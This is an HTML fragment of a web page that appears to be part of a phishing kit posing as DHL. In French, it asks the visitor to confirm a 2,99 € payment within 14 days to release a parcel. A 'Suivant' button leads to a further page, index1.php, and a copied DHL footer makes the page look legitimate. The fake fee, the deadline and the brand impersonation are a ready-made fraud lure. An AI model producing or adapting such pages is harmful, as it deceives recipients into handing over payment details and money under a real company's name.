        			...
        			<div class="lettre">
        				...
        				<div class="msaws mt-4">
    						...
    						<div class="important mt-4">
    							...
    							<p>Pour finaliser la livraison dès que possible, veuillez confirmer le paiement (2,99 €) en cliquant sur Suivant. La confirmation en ligne doit être effectuée dans les 14 jours, avant expiration.</p>
    							<button class="btn" name="submit"><a href="index1.php">Suivant</a> </button>
    						</div>
        				</div>
        			</div>
        		</div>
        	...
        	<div class="container-fluid">
        		<div class="row">
        			<div class="col-lg-3 col-md-6 col-sm-6 col-12">
        				<ul>
        					<li class="power ">Centre d'aide</li>
        					<li>Service client</li>
        					<li>Connexion portail client</li>
        					<li>Partenaires numériques et intégrations</li>
        					<li>Portail développeur</li>
        				</ul>
        			</div>
        			<div class="col-lg-3 col-md-6 col-sm-6 col-12">
        				<ul>
        					<li class="active">Nos divisions</li>
        			...
        			<div class="col-lg-3 col-md-6 col-sm-6 col-12">
        				<ul>
        					<li class="active">Secteurs d'activité</li>
							<li>Auto-Mobilité</li>
							<li>Produits chimiques</li>
							<li>Consommation</li>
							<li>Énergie</li>
							<li>Ingénierie et fabrication</li>
							<li>Sciences de la vie et santé</li>
        			...
        			<div class="col-lg-3 col-md-6 col-sm-6 col-12">
        				<ul>
        					<li class="active">Informations sur l'entreprise</li>
							<li>À propos de DHL</li>
							<li>Carrières</li>
							<li>Centre de presse</li>
							<li>Durabilité</li>
							<li>Perspectives et innovation</li>
							<li>Partenaires logistiques officiels</li>
        				</ul>
        			</div>
        		</div>
        	</div>
